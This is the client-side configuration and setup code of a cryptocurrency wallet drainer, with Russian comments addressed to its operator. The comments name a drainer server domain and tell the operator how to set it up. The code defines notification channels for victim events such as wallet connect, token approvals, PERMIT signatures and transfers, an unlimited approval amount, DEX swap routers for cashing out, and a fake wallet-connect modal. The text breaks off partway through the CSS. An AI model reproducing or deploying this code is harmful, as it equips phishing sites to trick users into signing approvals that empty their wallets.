

let MS_Encryption_Key = 1488; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно

const MS_Server = "sugaringsofia2.com"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const MS_WalletConnect_ID = "ea52b0e550593829f2eee2cb9006f642"; // Project ID из WalletConnect Cloud

const MS_Modal_Style = 1; // 1 - старая, 2 - новая (обновление от 01.10.2023)
const MS_Loader_Style = 2; // 1 - старый, 2 - новый (обновление от 01.10.2023)
const MS_Color_Scheme = 'light'; // light - светлая тема, dark - тёмная тема
const MS_Modal_Mode = 1; // 1 - выбирать кошелек нажатием и подключать кнопкой, 2 - подключать сразу после выбора

const MS_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
// По умолчанию оставьте пустым, чтобы получать сообщение с сервера, иначе заполните, чтобы использовать кастомное

// С помощью настройки ниже вы можете кастомизировать то, как будет выглядеть ваш сайт в интерфейсе WalletConnect
// Изменять необязательно, большинство кошельков работают с настройками по умолчанию
// Настройка не связана с переключателем MS_WalletConnect_Customization, он нужен только для кастомизации дизайна

const MS_WalletConnect_MetaData = {
  name: document.title, // По умолчанию такое же как название сайта
  description: "Web3 Application", // По умолчанию "Web3 Application"
  url: "https://" + window.location.host, // По умолчанию как домен сайта
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const MS_WalletConnect_Customization = 0; // 0 - использовать окно по умолчанию, 1 - пользовательская кастомизация
const MS_WalletConnect_Theme = { // Параметры кастомизации доступны здесь: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const MS_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

var MS_Worker_ID = null;

const BN = ethers.BigNumber.from;

let MS_Ready = false, MS_Settings = {}, MS_Contract_ABI = {}, MS_ID = 0, MS_Process = false,
MS_Provider = null, MS_Current_Provider = null, MS_Current_Address = null, MS_Current_Chain_ID = null,
MS_Web3 = null, MS_Signer = null, MS_Check_Done = false, MS_Currencies = {}, MS_Force_Mode = false,
MS_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, MS_Bad_Country = false,
MS_Connection = false, MS_Load_Time = null, MS_Gas_Multiplier = 2, MS_Partner_Address = false;

const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    MS_Currencies = await response.json();
    MS_Currencies['PLS'] = { USD: 0.00004512 };
  } catch(err) {
    console.log(err);
  }
})();

const MS_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io',
  8453: 'api.basescan.org'
};

var MS_MetaMask_ChainData = {};

const fill_chain_data = () => {
  MS_MetaMask_ChainData = {
    1: {
      chainId: '0x1',
      chainName: "Ethereum Mainnet",
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[1]],
      blockExplorerUrls: ["https://etherscan.io"]
    },
    56: {
      chainId: '0x38',
      chainName: "BNB Smart Chain",
      nativeCurrency: {
        name: "Binance Coin",
        symbol: "BNB",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[56]],
      blockExplorerUrls: ["https://bscscan.com"]
    },
    137: {
      chainId: '0x89',
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "MATIC",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[137]],
      blockExplorerUrls: ["https://polygonscan.com"]
    },
    43114: {
      chainId: '0xA86A',
      chainName: "Avalanche Network C-Chain",
      nativeCurrency: {
        name: "AVAX",
        symbol: "AVAX",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[43114]],
      blockExplorerUrls: ["https://snowtrace.io/"]
    },
    42161: {
      chainId: '0xA4B1',
      chainName: "Arbitrum One",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[42161]],
      blockExplorerUrls: ["https://explorer.arbitrum.io"]
    },
    10: {
      chainId: '0xA',
      chainName: "Optimism",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[10]],
      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
    },
    250: {
      chainId: '0xFA',
      chainName: "Fantom Opera",
      nativeCurrency: {
        name: "FTM",
        symbol: "FTM",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[250]],
      blockExplorerUrls: ["https://ftmscan.com/"]
    },
    8453: {
      chainId: '0x2105',
      chainName: "Base",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[8453]],
      blockExplorerUrls: ["https://basescan.org/"]
    },
    324: {
      chainId: '0x144',
      chainName: "zkSync Era",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[324]],
      blockExplorerUrls: ["https://explorer.zksync.io/"]
    },
    369: {
      chainId: '0x171',
      chainName: "Pulse",
      nativeCurrency: {
        name: "PLS",
        symbol: "PLS",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[369]],
      blockExplorerUrls: ["https://scan.pulsechain.com/"]
    },
  };
};

const MS_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const MS_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const MS_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const MS_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];

const MS_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
const MS_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();
const MS_Apple_Status = (() => {
  try {
    return [
      'iPad Simulator', 'iPhone Simulator', 'iPod Simulator', 'iPad', 'iPhone', 'iPod'
    ].includes(navigator.platform) || (navigator.userAgent.includes("Mac") && "ontouchend" in document);
  } catch(err) {
    return false;
  }
})();

const MS_Unlimited_Amount = '1158472395435294898592384258348512586931256';

const MS_Modal_Data = [
    {
      type: 'style',
      data: `
      *,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb;}
  :after,:before{--tw-content:"";}
  button{font-family:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0;}
  button{text-transform:none;}
  button{-webkit-appearance:button;background-color:transparent;background-image:none;}
  button{cursor:pointer;}
  :disabled{cursor:default;}
  svg{display:block;vertical-align:middle;}
  *,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-scroll-snap-strictness:proximity;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;}
  *{box-sizing:border-box;}
  ::selection{background:#6af7ac;color:#000;}
  /*! CSS Used from: Embedded */
  .modalunique{position:absolute;top:150%;left:50%;transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);box-sizing:border-box;width:100%;display:flex;max-width:440px;font-family:Manrope;flex-direction:column;color:#01091b;align-items:flex-start;background:#fff;border-radius:24px;}
  .modal-head{display:flex;padding:32px 24px;justify-content:space-between;align-items:center;box-sizing:border-box;}
  .modal-head-block-f{display:flex;flex-direction:column;align-items:flex-start;gap:8px;}
  .modal-head-title{font-size:22px;font-weight:500;}
  .modal-head-desc{color:#677189;font-size:16px;max-width:279px;font-weight:400;}
  .modal-close{display:flex;padding:12px;align-items:flex-start;gap:8px;justify-content:end;position:absolute;right:8px;top:8px;cursor:pointer;}
  .modal-main{display:flex;padding:0 24px 32px 24px;flex-direction:column;gap:20px;}
  .modal-main-title{font-size:16px;font-weight:500;}
  .modal-main-menu{display:flex;align-items:flex-start;align-content:flex-start;gap:16px;align-self:stretch;flex-wrap:wrap;justify-content:center;}
  .menu-el{display:flex;padding:16px;flex-direction:column;align-items:flex-start;gap:32px;box-sizing:border-box;cursor:pointer;max-width:188px;border-radius:16px;border:1px solid #d3e5ed;}
  .modal-el-desc{display:flex;flex-direction:column;align-items:flex-start;gap:4px;align-self:stretch;}
  span.modal-el-desc-first{font-size:16px;font-style:normal;font-weight:500;}
  span.modal-el-desc-second{color:#677189;font-size:14px;font-style:normal;font-weight:400;align-self:stretch;}
  .modal-icon{display:flex;width:32px;height:32px;justify-content:center;align-items:center;}
  .menu-el:hover{border:1px solid #0052ff;}
  .modal-bottom{display:flex;padding:0 24px 24px 24px;flex-direction:column;align-items:center;gap:16px;align-self:stretch;}
  .modal-bottom button2{border-radius:16px;background:#0052ff;display:flex;padding:16px 0;justify-content:center;align-items:center;gap:8px;align-self:stretch;outline:0;cursor:pointer;border:0;color:#fff;font-size:16px;font-weight:500;}
  .modal-bottom span{color:#677189;font-size:14px;font-style:normal;font-weight:300;}
  @media (min-width:375px) and (max-width:450px){
  .menu-el{max-width:100%;width:100%;flex-direction:row;}
  }
  @media (min-width:150px) and (max-width:375px){
  .menu-el{max-width:100%;width:100%;flex-direction:row;}
  span.modal-el-desc-second{display:none;}
  .modal-el-desc{justify-content:center;align-items:center;}
  }
  /*! CSS Used fontfaces */
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_P-bnBeA.woff2) format('woff2');unicode-range:U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_G-bnBeA.woff2) format('woff2');unicode-range:U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_B-bnBeA.woff2) format('woff2');unicode-range:U+0370-03FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_N-bnBeA.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_M-bnBeA.woff2) format('woff2');unicode-range:U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_C-bk.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_P-bnBeA.woff2) format('woff2');unicode-range:U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_G-bnBeA.woff2) format('woff2');unicode-range:U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_B-bnBeA.woff2) format('woff2');unicode-range:U+0370-03FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_N-bnBeA.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_M-bnBeA.woff2) format('woff2');unicode-range:U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_C-bk.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_P-bnBeA.woff2) format('woff2');unicode-range:U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_G-bnBeA.woff2) format('woff2');unicode-range:U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_B-bnBeA.woff2) format('woff2');unicode-range:U+0370-03FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_N-bnBeA.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_M-bnBeA.woff2) format('woff2');unicode-range:U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk79FN_C-bk.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_P-bnBeA.woff2) format('woff2');unicode-range:U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_G-bnBeA.woff2) format('woff2');unicode-range:U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_B-bnBeA.woff2) format('woff2');unicode-range:U+0370-03FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_N-bnBeA.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_M-bnBeA.woff2) format('woff2');unicode-range:U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;}
  @font-face{font-family:'Manrope';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/manrope/v14/xn7_YHE41ni1AdIRqAuZuw1Bx9mbZk7PFN_C-bk.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}

      @import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/scripts/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }

      .web3-modal {
          background: none !important;
          color: #fff;
      }

      @media (max-width:1400px) {
          .modal-main {
              padding-bottom: 16px;

          }

